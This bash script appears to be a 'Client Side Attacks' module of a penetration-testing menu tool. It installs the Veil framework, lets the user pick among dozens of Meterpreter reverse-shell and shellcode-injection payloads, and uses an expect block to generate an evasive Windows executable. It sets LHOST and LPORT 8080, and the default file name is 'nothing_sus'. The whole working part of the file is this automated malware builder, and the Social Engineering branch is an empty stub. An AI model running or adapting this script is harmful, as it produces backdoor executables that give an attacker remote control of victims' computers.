#!/usr/bin/env bash
source main.sh
folder="custom_scripts/$current"
current="Client Side Attacks"
ready
# END OF BOILER (DO NOT REMOVE OR MODIFY ABOVE CODE)
    


selectOptions "Client Side Attacks" "Selection" "Try another selection" "Gaining Access" "Social Engineering"
if [[ "$SO" == "1" ]]; then   # Gaining Access
  installPackages veil
  :
  selectOptions "Setup Type" "Selection" "Try another selection" "Express" "Custom"
  if [[ $SO == "1" ]]; then # express
    :
  else #custom  
    # get all required inputs
    getInput "Base Name" "Select a base name for output files." "nothing_sus"
    NAME=$SI
    selectOptions "Payloads" "Select Desired Option" "Select a Valid Option" "autoit/shellcode_inject/flat.py" "auxiliary/coldwar_wrapper.py" "auxiliary/macro_converter.py" "auxiliary/pyinstaller_wrapper.py" "c/meterpreter/rev_http.py" "c/meterpreter/rev_http_service.py" "c/meterpreter/rev_tcp.py" "c/meterpreter/rev_tcp_service.py" "cs/meterpreter/rev_http.py" "cs/meterpreter/rev_https.py" "cs/meterpreter/rev_tcp.py" "cs/shellcode_inject/base64.py" "cs/shellcode_inject/virtual.py" "go/meterpreter/rev_http.py" "go/meterpreter/rev_https.py" "go/meterpreter/rev_tcp.py" "go/shellcode_inject/virtual.py" "lua/shellcode_inject/flat.py" "perl/shellcode_inject/flat." "powershell/meterpreter/rev_http.py" "powershell/meterpreter/rev_https.py" "powershell/meterpreter/rev_tcp.py" "powershell/shellcode_inject/psexec_virtual.py" "powershell/shellcode_inject/virtual.py" "python/meterpreter/bind_tcp.py" "python/meterpreter/rev_http.py" "python/meterpreter/rev_https.py" "python/meterpreter/rev_tcp.py" "python/shellcode_inject/aes_encrypt.py" "python/shellcode_inject/arc_encrypt.py" "python/shellcode_inject/base64_substitution.py" "python/shellcode_inject/des_encrypt.py" "python/shellcode_inject/flat.py" "python/shellcode_inject/letter_substitution.py" "python/shellcode_inject/pidinject.py" "python/shellcode_inject/stallion.py" "ruby/meterpreter/rev_http.py" "ruby/meterpreter/rev_https.py" "ruby/meterpreter/rev_tcp.py" "ruby/shellcode_inject/base64.py" "ruby/shellcode_inject/flat.py"
    PAYLOAD=$SO
    # getInput "Localhost IP" "Type your LHOST IP" "191.330.165.7"
    # LHOST=$SI
    echo $DI
    sleep 5
    # auto-run and set options
    expect -c '
    set timeout -1
    spawn "veil"
    expect ">: "
    send -- "update\r"
    send -- "\r"
    expect ">: "
    send -- "use 1\r"
    expect ">: "
    send -- "use '$PAYLOAD'\r"
    expect "]: "
    send -- "set LHOST '$IP'\r"
    expect "]: "
    send -- "set LPORT 8080\r"
    expect "]: "
    send -- "set PROCESSORS 1\r"
    expect "]: "
    send -- "set SLEEP 4\r"
    expect "]: "

    send -- "generate\r"
    expect ": "
    send -- "'$NAME'\r"
    expect "..."
    send -- "\r"
    expect ">: "
    send -- "exit\r"
    interact
    '
    mkdir "output/$NAME/"
    mv "$(find / -name ${NAME}.exe)" "output/$NAME/"
    # mv "$(find / -name ${NAME}.*)" "output/$NAME/"
    message "Success" "You can find all files in under \"TropX/output/$NAME\""
  fi
    
elif [[ "$SO" == "2" ]]; then # Social Engineering
  :
fi
